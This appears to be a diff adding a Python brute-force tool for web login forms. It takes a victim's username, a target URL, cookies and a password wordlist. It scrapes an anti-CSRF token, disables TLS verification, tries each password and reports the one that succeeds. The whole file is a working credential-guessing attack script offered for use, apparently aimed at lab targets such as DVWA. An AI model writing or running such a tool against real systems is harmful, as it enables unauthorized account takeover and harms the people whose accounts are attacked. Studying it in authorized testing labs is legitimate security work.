@@ -1,0 +1,187 @@
+#!/usr/bin/env python
+from sys import argv
+import requests
+import ssl
+import os.path
+from bs4 import BeautifulSoup as Soup
+import argparse
+import warnings
+import signal
+
+warnings.filterwarnings("ignore")
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--username", required=True, help='Victim\'s username to bruteforce')
+parser.add_argument("-t", "--target", required=True, help='App URL')
+parser.add_argument("-c", "--cookies", required=True, help='App Cookies')
+parser.add_argument("-d", "--data", required=True, help='Form Data/Parameters')
+parser.add_argument("-w", "--wordlist", required=True, help='Path to password/wordlist')
+parser.add_argument("-m", "--message", required=True, help='App message if password fail')
+
+args = parser.parse_args()
+
+username = args.username
+target = args.target
+cookies = args.cookies
+data = args.data
+wordlist = args.wordlist
+message = args.message
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+ssl._create_default_https_context = ssl._create_unverified_context
+
+''' 
+parseCookie
+@param: cookie (String)
+
+Parse the target's cookies from string
+'''
+def parseCookie(cookies):
+
+  if cookies is None:
+    cookie = cookies
+  else:
+    cookie = {}
+
+    for item in cookies.split(';'):
+      item = item.strip()
+      if not item:
+          continue
+      if '=' not in item:
+          cookie[item] = None
+          continue
+      name, value = item.split('=', 1)
+      cookie[name] = value
+
+  return cookie
+
+''' 
+parseData
+@param: data (String)
+
+Parse the target's form data from string
+'''
+def parseData(data, username, password, csrf):
+
+  if data is not None:
+    d = {}
+
+    for item in data.split('&'):
+      item = item.strip()
+      if not item:
+          continue
+      if '=' not in item:
+          d[item] = None
+          continue
+      name, value = item.split('=', 1)
+      if value == "^PASS^":
+        d[name] = password
+      elif value == "^USER^":
+        d[name] = username
+      elif value == "^CSRF^":
+        d[name] = csrf
+      else:
+        d[name] = value
+  else:
+    d = None
+
+  return d
+
+''' 
+checkSuccess
+@param: html (String)
+
+Searches the response HTML for our specified success message
+'''
+def checkSuccess(html):
+  # get our soup ready for searching
+  soup = Soup(html)
+  # check for our success message in the soup
+  search = soup.findAll(text=message)
+
+  if not search:
+    success = True
+
+  else:
+    success = False
+
+  # return the brute force result
+  return success
+
+try:
+
+  try:
+    # Check URL first
+    get = requests.get(target,verify=False)
+
+    # If response 200 let's rock
+    if get.status_code == 200:
+
+      # set up our target, cookie and session
+      s = requests.Session()
+      cookie = parseCookie(cookies)
+      target_page = s.get(target, cookies=cookie,verify=False)
+
+      # Get the current CSRF token from the target
+      page_source = target_page.text
+      soup = Soup(page_source);
+      csrf_token = soup.findAll(attrs={"name": "user_token"})
+
+      if not csrf_token:
+        csrf = None
+      else:
+        csrf = csrf_token[0].get('value')
+      
+      # Display target and current Anti-CSRF Token
+      print(f"{bcolors.HEADER}TARGET URL: {target}{bcolors.ENDC}")
+      print(f"{bcolors.HEADER}Anti-CSRF Token: {csrf}{bcolors.ENDC}")
+
+      if os.path.isfile(wordlist) is True:
+        # Loop through the provided password file
+        with open(wordlist) as f:
+          print(f"{bcolors.OKCYAN}Running brute force attack...{bcolors.ENDC}")
+          for password in f:
+
+            password = password.strip()
+
+            # setup the payload
+            payload = parseData(data, username, password, csrf)
+            r = s.get(target, cookies=cookie, params=payload,verify=False)
+            success = checkSuccess(r.text)
+
+            if not success:
+              # Displays password tries and strips whitespace from password list  
+              print(f"{bcolors.FAIL}password tryed:  {password}{bcolors.ENDC}")
+            else:
+              # Success! Show the result
+              print(f"{bcolors.OKGREEN}Password is: {password}{bcolors.ENDC}")
+              break
+
+        # We failed, bummer. 
+        if not success:
+          print(f"{bcolors.WARNING}{target}:Brute force failed. No matches found.")
+
+      else:
+        print(f"{bcolors.FAIL}Wordlist file not found.")
+
+    else:
+      print(f"{bcolors.FAIL}{target}: is Not reachable, status_code: {get.status_code}{bcolors.ENDC}")
+
+  #Exception
+  except requests.exceptions.RequestException as e:
+    # print URL with Errs
+    raise SystemExit(f"{bcolors.FAIL}{target}: is Not reachable \nErr: {e}{bcolors.ENDC}")
+    
+except KeyboardInterrupt:
+  print("Program stopped by CTRL-C")
+  exit(0)
